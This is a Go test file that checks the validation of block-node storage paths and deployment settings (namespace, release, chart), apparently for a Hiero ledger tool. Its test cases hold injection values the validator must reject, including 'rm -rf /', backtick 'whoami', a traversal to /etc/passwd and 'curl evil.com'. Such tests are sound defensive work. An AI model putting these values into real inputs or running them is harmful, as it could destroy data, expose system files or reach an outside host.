// SPDX-License-Identifier: Apache-2.0

package config

import (
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// TestBlockNodeStorage_Validate tests the validation of storage paths
func TestBlockNodeStorage_Validate(t *testing.T) {
	tests := []struct {
		name        string
		storage     BlockNodeStorage
		expectError bool
		errorMsg    string
	}{
		{
			name: "valid_all_paths",
			storage: BlockNodeStorage{
				BasePath:    "/mnt/storage",
				ArchivePath: "/mnt/storage/archive",
				LivePath:    "/mnt/storage/live",
				LogPath:     "/mnt/storage/logs",
			},
			expectError: false,
		},
		{
			name: "valid_only_base_path",
			storage: BlockNodeStorage{
				BasePath: "/opt/block-node",
			},
			expectError: false,
		},
		{
			name: "invalid_base_path_with_shell_metacharacters",
			storage: BlockNodeStorage{
				BasePath: "/mnt/storage; echo hacked",
			},
			expectError: true,
			errorMsg:    "shell metacharacters",
		},
		{
			name: "invalid_archive_path_with_path_traversal",
			storage: BlockNodeStorage{
				ArchivePath: "/mnt/../etc/passwd",
			},
			expectError: true,
			errorMsg:    "'..' segments",
		},
		{
			name: "invalid_live_path_with_backticks",
			storage: BlockNodeStorage{
				LivePath: "/mnt/`whoami`",
			},
			expectError: true,
			errorMsg:    "shell metacharacters",
		},
		{
			name: "invalid_log_path_with_pipe",
			storage: BlockNodeStorage{
				LogPath: "/mnt/logs | cat",
			},
			expectError: true,
			errorMsg:    "shell metacharacters",
		},
		{
			name: "empty_all_paths",
			storage: BlockNodeStorage{
				BasePath:    "",
				ArchivePath: "",
				LivePath:    "",
				LogPath:     "",
			},
			expectError: false, // Empty paths are allowed - defaults will be used
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := tt.storage.Validate()

			if tt.expectError {
				require.Error(t, err, "Expected validation error")
				assert.Contains(t, err.Error(), tt.errorMsg)
			} else {
				require.NoError(t, err, "Expected no validation error")
			}
		})
	}
}

// TestBlockNodeConfig_Validate tests the validation of block node configuration
func TestBlockNodeConfig_Validate(t *testing.T) {
	tests := []struct {
		name        string
		config      BlockNodeConfig
		expectError bool
		errorMsg    string
	}{
		{
			name: "valid_config",
			config: BlockNodeConfig{
				Namespace: "block-node-ns",
				Release:   "my-release",
				Chart:     "oci://ghcr.io/hiero-ledger/hiero-block-node/block-node-server",
				Version:   "0.24.0",
				Storage: BlockNodeStorage{
					BasePath: "/mnt/storage",
				},
			},
			expectError: false,
		},
		{
			name: "invalid_namespace_with_special_chars",
			config: BlockNodeConfig{
				Namespace: "block-node;rm -rf /",
				Release:   "my-release",
			},
			expectError: true,
			errorMsg:    "invalid namespace",
		},
		{
			name: "invalid_release_with_spaces",
			config: BlockNodeConfig{
				Namespace: "block-node-ns",
				Release:   "my release with spaces",
			},
			expectError: true,
			errorMsg:    "invalid release name",
		},
		{
			name: "invalid_chart_with_shell_metacharacters",
			config: BlockNodeConfig{
				Chart: "malicious-chart; curl evil.com",
			},
			expectError: true,
			errorMsg:    "chart reference contains invalid characters",
		},
		{
			name: "invalid_storage_path",
			config: BlockNodeConfig{
				Namespace: "block-node-ns",
				Release:   "my-release",
				Storage: BlockNodeStorage{
					BasePath: "/mnt/storage | cat",
				},
			},
			expectError: true,
			errorMsg:    "shell metacharacters",
		},
		{
			name: "valid_empty_optional_fields",
			config: BlockNodeConfig{
				Storage: BlockNodeStorage{},
			},
			expectError: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := tt.config.Validate()

			if tt.expectError {
				require.Error(t, err, "Expected validation error")
				assert.Contains(t, err.Error(), tt.errorMsg)
			} else {
				require.NoError(t, err, "Expected no validation error")
			}
		})
	}
}
